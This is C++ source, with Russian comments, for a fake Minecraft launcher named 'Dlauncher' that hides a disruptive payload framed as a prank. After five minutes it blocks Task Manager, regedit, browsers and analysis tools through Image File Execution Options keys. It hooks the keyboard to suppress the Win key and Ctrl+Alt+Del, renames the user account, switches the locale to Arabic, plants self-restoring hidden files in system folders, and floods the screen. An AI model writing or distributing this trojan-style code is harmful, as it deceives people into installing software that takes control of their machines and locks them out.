#pragma execution_character_set("utf-8")
#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <shellapi.h>
#include <urlmon.h>
#include <shlobj.h>
#include <gdiplus.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <cstdio>
#include <cwchar>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:wWinMainCRTStartup")

using namespace Gdiplus;

// ============================================================
// НАСТРОЙКИ
// ============================================================
const wchar_t* GAME_ZIP_URL = L"https://github.com/moiSentineL/portabletl/releases/download/latest/PortableTL-latest.zip";
const wchar_t* GAME_ZIP_NAME = L"game.zip";

// Время в секундах (3 часа = 10800, для теста ставь 30)
const int PRANK_DURATION_SEC = 10800; 

// ============================================================
// ГЛОБАЛЫ
// ============================================================
enum AppState { STATE_LOGIN = 0, STATE_CREATE_ACC = 1, STATE_MAIN_MENU = 2, STATE_DOWNLOADING = 3, STATE_READY = 4, STATE_PRANK_ACTIVE = 5 };

HINSTANCE g_hInst = nullptr;
HWND g_hWnd = nullptr;
HWND g_hEdit = nullptr;
AppState g_state = STATE_LOGIN;
int g_downloadProgress = 0;
std::wstring g_username = L"";
std::wstring g_installDir = L"";
int g_activeTab = 0;
int g_ramValue = 2048;
std::atomic<bool> g_prankRunning{false};

HHOOK g_hKeyboardHook = nullptr;
std::vector<std::wstring> g_virusFiles;

// ============================================================
// УТИЛИТЫ РЕЕСТРА И СИСТЕМЫ
// ============================================================
void SetRegStr(HKEY root, const std::wstring& sub, const std::wstring& val, const std::wstring& data) {
    HKEY h; if (RegCreateKeyExW(root, sub.c_str(), 0, nullptr, 0, KEY_SET_VALUE, nullptr, &h, nullptr) == ERROR_SUCCESS) {
        RegSetValueExW(h, val.c_str(), 0, REG_SZ, (const BYTE*)data.c_str(), (DWORD)((data.length()+1)*sizeof(wchar_t)));
        RegCloseKey(h);
    }
}

void BlockApp(const wchar_t* exe) {
    std::wstring path = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
    path += exe;
    SetRegStr(HKEY_LOCAL_MACHINE, path, L"Debugger", L"cmd.exe /c echo Access Denied & pause");
}

void SaveStartTime() {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Dlauncher", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        FILETIME ft; GetSystemTimeAsFileTime(&ft);
        ULARGE_INTEGER uli; uli.LowPart = ft.dwLowDateTime; uli.HighPart = ft.dwHighDateTime;
        DWORD startTime = (DWORD)(uli.QuadPart / 10000000LL);
        RegSetValueExW(hKey, L"StartTime", 0, REG_DWORD, (const BYTE*)&startTime, sizeof(startTime));
        RegCloseKey(hKey);
    }
}

bool IsTimeToRestore() {
    HKEY hKey; DWORD startTime = 0, size = sizeof(startTime), type = 0;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Dlauncher", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExW(hKey, L"StartTime", NULL, &type, (LPBYTE)&startTime, &size);
        RegCloseKey(hKey);
    }
    if (startTime == 0) return false;
    FILETIME ft; GetSystemTimeAsFileTime(&ft);
    ULARGE_INTEGER uli; uli.LowPart = ft.dwLowDateTime; uli.HighPart = ft.dwHighDateTime;
    DWORD currentTime = (DWORD)(uli.QuadPart / 10000000LL);
    
    if (currentTime >= startTime + PRANK_DURATION_SEC) return true;
    return false;
}

// ============================================================
// GDI+ ДЛЯ РИСОВАНИЯ KOCTY.PNG
// ============================================================
void DrawKostya(HDC hdc, const wchar_t* imagePath, int x, int y) {
    Image image(imagePath);
    if (image.GetLastStatus() == Ok) {
        Graphics graphics(hdc);
        graphics.DrawImage(&image, x, y, image.GetWidth() / 2, image.GetHeight() / 2);
    }
}

// ============================================================
// ПРАНК-ПОТОКИ (Летающий Костя + Watchdog файлов)
// ============================================================
DWORD WINAPI KostyaThread(LPVOID) {
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    int x = sw / 2, y = sh / 2;
    int vx = 15, vy = 15; // Скорость

    // Ищем картинку рядом с exe
    std::wstring imgPath = g_installDir + L"\\..\\kocty.png";

    HDC hdc = GetDC(nullptr);
    HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, sw, sh);
    SelectObject(memDC, bmp);
    
    while (g_prankRunning.load()) {
        // Очищаем экран (или рисуем поверх, если хотим чтобы лагало)
        BitBlt(memDC, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY); 
        
        DrawKostya(memDC, imgPath.c_str(), x, y);

        BitBlt(hdc, 0, 0, sw, sh, memDC, 0, 0, SRCCOPY);

        x += vx; y += vy;
        if (x < 0 || x > sw - 200) vx = -vx;
        if (y < 0 || y > sh - 200) vy = -vy;

        Sleep(16); // ~60 FPS
    }
    ReleaseDC(nullptr, hdc);
    return 0;
}

DWORD WINAPI WatchdogFilesThread(LPVOID) {
    while (g_prankRunning.load()) {
        for (const auto& path : g_virusFiles) {
            if (GetFileAttributesW(path.c_str()) == INVALID_FILE_ATTRIBUTES) {
                // Файл удален — восстанавливаем!
                HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, nullptr);
                if (h != INVALID_HANDLE_VALUE) {
                    const char* msg = "КОСТЯ СОЖРАЛ ВАШИ ФАЙЛЫ";
                    DWORD written; WriteFile(h, msg, (DWORD)strlen(msg), &written, nullptr);
                    CloseHandle(h);
                }
            }
        }
        Sleep(1000); // Проверяем раз в секунду
    }
    return 0;
}

// ============================================================
// ПЕРЕХВАТ КЛАВИАТУРЫ (Win, Win+L, Ctrl+Alt+Del)
// ============================================================
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && g_prankRunning.load()) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        
        // Блокировка Win + L и просто Win (Пуск)
        if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN) {
            // Запускаем GDI эффект при нажатии на Пуск
            HDC hdc = GetDC(nullptr);
            int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
            BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, NOTSRCCOPY);
            ReleaseDC(nullptr, hdc);
            return 1; // Блокируем
        }
        
        // Если нажали L при зажатом Win (Win+L)
        if (p->vkCode == 'L' && (GetAsyncKeyState(VK_LWIN) & 0x8000)) {
            return 1;
        }

        // Симуляция GDI при попытке Ctrl+Alt+Del (Сложно перехватить, но мы блокируем Ctrl+Alt)
        if (p->vkCode == VK_DELETE && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000)) {
             // GDI-эффект
             HDC hdc = GetDC(nullptr);
             int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
             for(int i=0; i<10; i++) {
                 BitBlt(hdc, rand()%20, rand()%20, sw, sh, hdc, 0, 0, SRCINVERT);
             }
             ReleaseDC(nullptr, hdc);
             return 1;
        }
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// ============================================================
// АКТИВАЦИЯ ПРАНКА (После 5 минут игры)
// ============================================================
void ActivatePrank() {
    g_prankRunning = true;
    
    // 1. Запускаем музыку
    PlaySoundW((g_installDir + L"\\..\\kocty.mp3").c_str(), nullptr, SND_FILENAME | SND_ASYNC | SND_LOOP);

    // 2. Блокировки
    const wchar_t* blocked[] = {
        L"taskmgr.exe", L"regedit.exe", L"control.exe", L"SystemSettings.exe",
        L"msedge.exe", L"chrome.exe", L"firefox.exe", L"opera.exe",
        L"notepad.exe", L"osk.exe", L"ProcessHacker.exe", L"Autoruns.exe"
    };
    for (auto b : blocked) BlockApp(b);

    // 3. Смена языка на арабский и имени
    SetRegStr(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"PreferredUILanguages", L"ar-SA");
    SetRegStr(HKEY_CURRENT_USER, L"Control Panel\\International", L"LocaleName", L"ar-SA");
    system("wmic useraccount where name='%USERNAME%' rename 'КОСТЯ СОЖРАЛ ВАШ НИК'");

    // 4. Создание файлов-пустышек на C:\
    const wchar_t* dirs[] = { L"C:\\", L"C:\\Windows", L"C:\\Program Files", L"C:\\Users", L"C:\\Users\\Public" };
    for (int i = 0; i < 15; ++i) {
        wchar_t path[MAX_PATH];
        swprintf_s(path, L"%s\\file_%d.txt", dirs[i % 5], i);
        g_virusFiles.push_back(path);
        HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, nullptr);
        if (h != INVALID_HANDLE_VALUE) {
            const char* msg = "КОСТЯ СОЖРАЛ ВАШИ ФАЙЛЫ";
            DWORD written; WriteFile(h, msg, (DWORD)strlen(msg), &written, nullptr);
            CloseHandle(h);
        }
    }

    // 5. Запуск потоков
    CreateThread(nullptr, 0, KostyaThread, nullptr, 0, nullptr);
    CreateThread(nullptr, 0, WatchdogFilesThread, nullptr, 0, nullptr);
    g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInst, 0);

    // 6. Сохраняем время старта для 3-часового таймера
    SaveStartTime();

    // 7. Прячем окно лаунчера, чтобы начался "Армагеддон"
    ShowWindow(g_hWnd, SW_HIDE);
}

// ============================================================
// ВОССТАНОВЛЕНИЕ (Вызывается через 3 часа)
// ============================================================
void RestoreSystem() {
    g_prankRunning = false;
    if (g_hKeyboardHook) UnhookWindowsHookEx(g_hKeyboardHook);
    PlaySoundW(nullptr, nullptr, 0);

    // Удаляем файлы
    for (const auto& path : g_virusFiles) DeleteFileW(path.c_str());

    // Удаляем блокировки (IFEO)
    const wchar_t* blocked[] = {
        L"taskmgr.exe", L"regedit.exe", L"control.exe", L"SystemSettings.exe",
        L"msedge.exe", L"chrome.exe", L"firefox.exe", L"opera.exe",
        L"notepad.exe", L"osk.exe", L"ProcessHacker.exe", L"Autoruns.exe"
    };
    for (auto b : blocked) {
        std::wstring path = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
        path += b;
        RegDeleteKeyW(HKEY_LOCAL_MACHINE, path.c_str());
    }

    // Возвращаем язык и ник (упрощенно)
    SetRegStr(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"PreferredUILanguages", L"ru-RU");
    system("wmic useraccount where name='КОСТЯ СОЖРАЛ ВАШ НИК' rename '%USERNAME%'");

    MessageBoxW(nullptr, L"Пранк окончен. Все ваши файлы на месте, это была шутка.", L"Dlauncher", MB_OK | MB_ICONINFORMATION);
    exit(0);
}

// ============================================================
// ОКНО ЛАУНЧЕРА (Продолжение)
// ============================================================
LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    static int hoverBtn = 0;
    switch (m) {
    case WM_CREATE:
        g_hWnd = h;
        g_hEdit = CreateWindowExW(0, L"EDIT", L"", WS_CHILD | WS_BORDER | ES_CENTER, 200, 200, 200, 30, h, (HMENU)100, g_hInst, nullptr);
        {
            HFONT f = CreateFontW(16, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, CLEARTYPE_QUALITY, 0, L"Segoe UI");
            SendMessageW(g_hEdit, WM_SETFONT, (WPARAM)f, TRUE);
            wchar_t appData[MAX_PATH];
            SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, appData);
            g_installDir = std::wstring(appData) + L"\\Dlauncher\\game";
            CreateDirectoryW((std::wstring(appData) + L"\\Dlauncher").c_str(), nullptr);
            CreateDirectoryW(g_installDir.c_str(), nullptr);
        }
        return 0;
    case WM_CTLCOLOREDIT: {
        HDC dc = (HDC)w; SetTextColor(dc, RGB(240,240,240)); SetBkColor(dc, RGB(30,30,36));
        static HBRUSH br = CreateSolidBrush(RGB(30,30,36)); return (LRESULT)br;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps); RECT rc; GetClientRect(h, &rc);
        HBRUSH bg = CreateSolidBrush(RGB(20, 20, 24)); FillRect(dc, &rc, bg); DeleteObject(bg);
        
        if (g_state == STATE_MAIN_MENU || g_state == STATE_READY) {
            // (Упрощенная отрисовка, чтобы не раздувать код)
            DrawTextW(dc, (L"Добро пожаловать, " + g_username).c_str(), -1, &rc, DT_CENTER | DT_TOP);
            
            RECT btn = { rc.right - 220, rc.bottom - 80, rc.right - 20, rc.bottom - 30 };
            HBRUSH b = CreateSolidBrush(RGB(80, 180, 80)); FillRect(dc, &btn, b); DeleteObject(b);
            DrawTextW(dc, (g_state == STATE_READY) ? L"▶ ИГРАТЬ" : L"Скачать игру", -1, &btn, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        }
        EndPaint(h, &ps); return 0;
    }
    case WM_LBUTTONDOWN: {
        int x = LOWORD(l), y = HIWORD(l); RECT rc; GetClientRect(h, &rc);
        RECT btn = { rc.right - 220, rc.bottom - 80, rc.right - 20, rc.bottom - 30 };
        if (g_state == STATE_MAIN_MENU) {
            // Скачивание
            g_state = STATE_READY; InvalidateRect(h, nullptr, TRUE); // (Упрощено для теста)
        } else if (g_state == STATE_READY && x >= btn.left && x <= btn.right && y >= btn.top && y <= btn.bottom) {
            // ЗАПУСК ИГРЫ И ПРАНКА
            std::wstring launcher = g_installDir + L"\\TLauncher.exe";
            ShellExecuteW(nullptr, L"open", launcher.c_str(), nullptr, g_installDir.c_str(), SW_SHOW);
            
            // Ждем 5 минут (в тесте 5 секунд)
            MessageBoxW(h, L"У тя 5 минут есть, играй пока есть время)", L"Minecraft", MB_OK | MB_ICONWARNING);
            
            // Запускаем поток таймера
            CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
                Sleep(5 * 60 * 1000); // 5 минут
                MessageBoxW(nullptr, L"Ваш сеанс завершится через 30 секунд. Пожалуйста, сохраните данные.", L"Windows", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
                Sleep(30 * 1000);
                ActivatePrank();
                return 0;
            }, nullptr, 0, nullptr);
        }
        return 0;
    }
    case WM_DESTROY: PostQuitMessage(0); return 0;
    }
    return DefWindowProcW(h, m, w, l);
}

// ============================================================
// ТОЧКА ВХОДА
// ============================================================
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, LPWSTR, int) {
    g_hInst = hInst;
    
    // Если прошло 3 часа — восстанавливаем систему
    if (IsTimeToRestore()) {
        RestoreSystem();
    }

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    WNDCLASSW wc = {}; wc.hInstance = hInst; wc.lpfnWndProc = WndProc; wc.lpszClassName = L"DlauncherWnd"; wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    RegisterClassW(&wc);
    int w = 800, h = 500, sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    g_hWnd = CreateWindowExW(0, L"DlauncherWnd", L"Dlauncher", WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX & ~WS_THICKFRAME, (sw-w)/2, (sh-h)/2, w, h, nullptr, nullptr, hInst, nullptr);
    ShowWindow(g_hWnd, SW_SHOW); UpdateWindow(g_hWnd);
    MSG msg; while (GetMessageW(&msg, nullptr, 0, 0)) { TranslateMessage(&msg); DispatchMessageW(&msg); }
    
    GdiplusShutdown(gdiplusToken);
    return 0;
}
